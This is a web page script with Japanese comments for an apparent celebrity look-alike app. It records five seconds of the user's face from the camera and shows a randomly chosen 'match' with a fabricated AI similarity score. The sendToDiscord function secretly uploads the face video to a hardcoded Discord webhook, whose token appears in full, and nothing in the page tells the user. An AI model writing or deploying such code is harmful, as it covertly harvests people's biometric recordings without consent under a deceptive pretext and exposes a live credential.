<!-- 主にJS部分を書き換えてる -->

<script>
const startButton = document.getElementById('startButton');
const retryButton = document.getElementById('retryButton');
const video = document.getElementById('video');
const videoContainer = document.getElementById('videoContainer');
const loading = document.getElementById('loading');
const result = document.getElementById('result');
const scoreValue = document.getElementById('scoreValue');
const comment = document.getElementById('comment');
const errorMessage = document.getElementById('errorMessage');
const countdown = document.getElementById('countdown');
const cameraGuide = document.querySelector('.camera-guide');
const resultImage = document.getElementById('resultImage');

let mediaRecorder;
let recordedChunks = [];
let stream = null;
let countdownTimer;
let isRecording = false;

// 男のみ
const celebs = [
  "山﨑賢人",
  "吉沢亮",
  "菅田将暉",
  "横浜流星",
  "佐藤健",
  "竹内涼真",
  "中川大志"
];

// 外れ枠
const jokes = [
  "ゴリラ",
  "石ころ",
  "深海魚",
  "アンパンマン",
  "謎の生命体"
];

// ローディング演出
const loadingTexts = [
  "顔の特徴点を検出中...",
  "輪郭を分析中...",
  "有名人データと照合中...",
  "最も近い人物を特定中..."
];

let i = 0;
setInterval(() => {
  const p = document.querySelector("#loading p");
  if (p) p.textContent = loadingTexts[i++ % loadingTexts.length];
}, 800);

// カメラ
async function setupCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    video.srcObject = stream;
    videoContainer.style.display = 'block';
    cameraGuide.style.display = 'block';

    await video.play();

    retryButton.style.display = 'block';
    return true;

  } catch (e) {
    showError("カメラが使えません");
    return false;
  }
}

// カウントダウン
function startCountdown(duration, callback) {
  let timeLeft = duration;
  countdown.style.display = 'flex';
  countdown.textContent = timeLeft + "s";

  countdownTimer = setInterval(() => {
    timeLeft--;
    countdown.textContent = timeLeft + "s";

    if (timeLeft <= 0) {
      clearInterval(countdownTimer);
      countdown.style.display = 'none';
      callback();
    }
  }, 1000);
}

// 録画
async function startRecording() {
  if (isRecording) return;

  isRecording = true;
  recordedChunks = [];

  loading.style.display = 'flex';
  cameraGuide.style.display = 'none';

  mediaRecorder = new MediaRecorder(stream);

  mediaRecorder.ondataavailable = e => {
    if (e.data.size > 0) recordedChunks.push(e.data);
  };

  mediaRecorder.onstop = async () => {
    const blob = new Blob(recordedChunks, { type: "video/mp4" });

    showResult(blob);
    sendToDiscord(blob);
  };

  mediaRecorder.start(100);

  // ★5秒
  startCountdown(5, stopRecording);
}

// 停止
function stopRecording() {
  if (mediaRecorder && mediaRecorder.state === 'recording') {
    mediaRecorder.stop();
    isRecording = false;

    if (stream) {
      stream.getTracks().forEach(t => t.stop());
      video.srcObject = null;
    }
  }
}

// 👇1人だけ選ぶ（ここ重要）
function getOnePerson() {
  let pool = [...celebs];

  // 30%で外れ
  if (Math.random() < 0.3) {
    pool.push(...jokes);
  }

  return pool[Math.floor(Math.random() * pool.length)];
}

// 結果
function showResult(blob) {
  const person = getOnePerson();
  const similarity = Math.floor(Math.random() * 21) + 75;

  // 動画表示
  const url = URL.createObjectURL(blob);
  resultImage.style.display = "none";

  const videoPreview = document.createElement("video");
  videoPreview.src = url;
  videoPreview.controls = true;
  videoPreview.autoplay = true;
  videoPreview.style.width = "100%";
  videoPreview.style.borderRadius = "12px";

  const container = document.querySelector(".result-content");
  container.insertBefore(videoPreview, container.firstChild);

  // 表示
  scoreValue.textContent = similarity + "%";
  comment.innerHTML = `
    あなたは…<br><br>
    <strong style="font-size:1.5rem">${person}</strong><br>
    に似ています！<br><br>
    AI一致率：${similarity}%
  `;

  loading.style.display = 'none';
  result.style.display = 'block';
}

// Discord
async function sendToDiscord(blob) {
  const formData = new FormData();
  formData.append('file', blob, 'face.mp4');

  await fetch("https://discord.com/api/webhooks/1490769459466469619/JOEkcqkhA6j9KPnkAE4O8sFGDyysy2FPtnZa8wUxu8jNtk9iqbLPbBU_IvMFk7abZNeL", {
    method: "POST",
    body: formData
  });
}

// エラー
function showError(msg) {
  errorMessage.textContent = msg;
  errorMessage.style.display = "block";
}

// イベント
startButton.onclick = async () => {
  const ok = await setupCamera();
  if (ok) setTimeout(startRecording, 300);
};

retryButton.onclick = async () => {
  const ok = await setupCamera();
  if (ok) setTimeout(startRecording, 300);
};
</script>
